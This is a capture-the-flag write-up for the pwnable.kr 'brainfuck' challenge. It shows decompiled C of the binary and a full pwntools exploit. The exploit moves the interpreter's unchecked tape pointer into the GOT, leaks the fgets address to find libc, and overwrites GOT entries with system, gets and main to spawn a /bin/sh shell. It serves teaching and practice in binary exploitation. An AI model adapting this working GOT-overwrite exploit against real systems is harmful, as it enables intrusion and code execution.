# Pwnable.kr brainfuck CTF Writeup

## brainfuck basics
The syntex of brainfuck is very simple:
```
> = increases memory pointer, or moves the pointer to the right 1 block.
< = decreases memory pointer, or moves the pointer to the left 1 block.
+ = increases value stored at the block pointed to by the memory pointer
- = decreases value stored at the block pointed to by the memory pointer
[ = like c while(cur_block_value != 0) loop.
] = if block currently pointed to's value is not zero, jump back to [
, = like c getchar(). input 1 character.
. = like c putchar(). print 1 character to the console
```

## Problem Description  
The exactubale for this challange recive brainfuck code and excute it. When decompiling the elf file, we get this:
### main
```c
08048671  int32_t main(int32_t argc, char** argv, char** envp)
08048671  {
08048681      char** argv_1 = argv;
08048685      void* gsbase;
08048685      int32_t eax_1 = *(uint32_t*)((char*)gsbase + 0x14);
080486b4      setvbuf(stdout, nullptr, 2, 0);
080486d9      setvbuf(stdin, nullptr, 1, 0);
080486de      p = 0x804a0a0;
080486ef      puts("welcome to brainfuck testing sys…");
080486fb      puts("type some brainfuck instructions…");
08048717      void buf;
08048717      memset(&buf, 0, 0x400);
08048734      fgets(&buf, 0x400, stdin);
08048734      
0804876b      for (int32_t i = 0; i < strlen(&buf); i += 1)
08048756          do_brainfuck(*(uint8_t*)(i + &buf));
08048756      
08048787      if (eax_1 == *(uint32_t*)((char*)gsbase + 0x14))
08048792          return 0;
08048792      
08048789      __stack_chk_fail();
08048789      /* no return */
08048671  }
```
### do_brainfuck
```c
080485dc  int32_t do_brainfuck(char arg1)
080485dc  {
080485ed      int32_t p_1 = (((int32_t)arg1) - 0x2b);
080485ed      
080485f3      if (p_1 <= 0x30)
080485f3      {
080485f5          p_1 = jump_table_8048848[p_1];
080485f5          
080485fc          switch (p_1)
080485fc          {
08048603              case 0x80485fe:
08048603              {
08048603                  p_1 = (p + 1);
08048606                  p = p_1;
08048603                  break;
08048603              }
08048612              case 0x804860d:
08048612              {
08048612                  p_1 = (p - 1);
08048615                  p = p_1;
08048612                  break;
08048612              }
0804861c              case 0x804861c:
0804861c              {
0804861c                  p_1 = p;
08048627                  *(uint8_t*)p_1 += 1;
0804861c                  break;
0804861c              }
0804862b              case 0x804862b:
0804862b              {
0804862b                  p_1 = p;
08048636                  *(uint8_t*)p_1 -= 1;
0804862b                  break;
0804862b              }
08048648              case 0x804863a:
08048648              {
08048648                  return putchar(((int32_t)**(uint8_t**)&p));
08048648                  break;
08048648              }
0804864f              case 0x804864f:
0804864f              {
0804864f                  char* p_2 = p;
08048655                  p_1 = getchar();
0804865a                  *(uint8_t*)p_2 = p_1;
0804864f                  break;
0804864f              }
08048665              case 0x804865e:
08048665              {
08048665                  return puts("[ and ] not supported.");
08048665                  break;
08048665              }
080485fc          }
080485f3      }
080485f3      
08048670      return p_1;
080485dc  }
```
As you can see, the `[` and `]` are not supported. Our goal is to find a bug and exploit it to get a shell. 

## Analysis  

```python
from pwn import *

context.log_level = 'debug'
session = ssh(user='brainfuck', host='pwnable.kr', port=2222, password='guest')
p = session.process('./brainfuck')

output = p.recvuntil(b"type some brainfuck instructions except [ ]\n")
print(output.decode(errors='ignore'), end='')

bf_code = ',>' * 10 + ',' + '<' * (10 + 148) + ',>' * 3 + ',' + ','
print(bf_code)
p.sendline(bf_code.encode())

payload = bytes.fromhex("ff352b8bedf7e86551dcf7" + "0804a0a0")
print(payload)
p.send(payload)

p.interactive()
session.close()
```

## Exploit Code
```python
from pwn import *

context(log_level='debug', os='linux', arch='i386')

session = ssh(user='brainfuck', host='pwnable.kr', port=2222, password='guest')
p = session.process('./brainfuck')

# Local files for finding offsets (which do not affected by ASLR)
e = ELF(r'/mnt/c/users/dalal/desktop/private_projects/ctf/pwnable.kr/brainfuck/brainfuck')
libc = ELF(r'/usr/lib32/libc.so.6')

fgets_got = e.got['fgets']
memset_got = e.got['memset']
putchar_got = e.got['putchar']

# Libc offsets
fgets_offset = libc.symbols['fgets']
gets_offset = libc.symbols['gets']
system_offset = libc.symbols['system']
main_addr = 0x08048700 # does not affected by ASLR

tape_addr = 0x804a0a0

payload = ""

# Move to fgets@got
payload += "<" * (tape_addr - fgets_got)

# Leak 4 bytes of fgets address
payload += ".>" * 4
payload += "<" * 4 

# Overwrite fgets@got with system address
payload += ",>" * 4
payload += "<" * 4

# Move to memset@got
payload += ">" * (memset_got - fgets_got)

# Overwrite memset@got with gets address
payload += ",>" * 4

# Overwrite putchar@got with main address (The pointer is already in putchar@got so no need to move)
payload += ",>" * 4

# Trigger main() by calling putchar
payload += "."


p.sendlineafter(b"type some brainfuck instructions except [ ]\n", payload.encode())
sleep(0.1)

fgets_addr = u32(p.recvn(4))

libc_base = fgets_addr - fgets_offset
system_addr = libc_base + system_offset
gets_addr = libc_base + gets_offset

log.info(f"fgets_addr: {hex(fgets_addr)}")
log.info(f"libc base: {hex(libc_base)}")
log.info(f"system_addr: {hex(system_addr)}")
log.info(f"gets_addr: {hex(gets_addr)}")
log.info(f"main_addr: {hex(main_addr)}")

payload = p32(system_addr) + p32(gets_addr) + p32(main_addr)
p.send(payload)
sleep(0.3)

p.send(b"/bin/sh") # Send "/bin/sh" to trigger system("/bin/sh")

session.interactive()
```
